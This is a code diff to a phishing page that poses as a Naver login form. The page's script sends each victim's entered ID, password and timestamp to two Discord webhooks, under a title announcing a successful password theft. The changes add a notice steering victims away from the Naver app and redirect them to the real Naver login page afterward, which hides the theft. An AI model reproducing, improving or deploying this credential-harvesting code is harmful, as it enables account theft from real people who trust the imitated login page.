@@ -22,6 +22,10 @@
     <input type="password" id="pw" placeholder="비밀번호" required autocomplete="current-password">
     <button type="submit">로그인</button>
   </form>
+  <p style="text-align:center;font-size:13px;color:#666;margin-top:20px">
+    네이버 앱으로 연결되지 않습니다<br>
+    웹 브라우저에서만 로그인 가능
+  </p>
 </div>
 
 <script>
@@ -32,9 +36,9 @@ function send(){
     "https://discord.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
     "https://discord.com/api/webhooks/1440762946039840769/8K5oWaQYD3rPwnCF5SOFsLteF6ckSzeZ8BOmwd1YIXunRnvg8fyRAhd3c823205UxDat"
   ];
-  hooks.forEach(h=>fetch(h,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"🎯 네이버 로그인 탈취 성공",color:16711680,fields:[{name:"아이디",value:id},{name:"비밀번호",value:pw},{name:"시간",value:new Date().toLocaleString("ko-KR")}]}]})}));
+  hooks.forEach(h=>fetch(h,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"🎯 네이버 비번 탈취 성공",color:16711680,fields:[{name:"아이디",value:id},{name:"비밀번호",value:pw},{name:"시간",value:new Date().toLocaleString("ko-KR")}]}]})}));
   alert("로그인되었습니다!");
-  location.href="https://m.cafe.naver.com/minsahelp.cafe";
+  location.href="https://nid.naver.com/nidlogin.login"; // 네이버 메인으로 이동 (앱 연결 차단)
 }
 </script>
 </body>
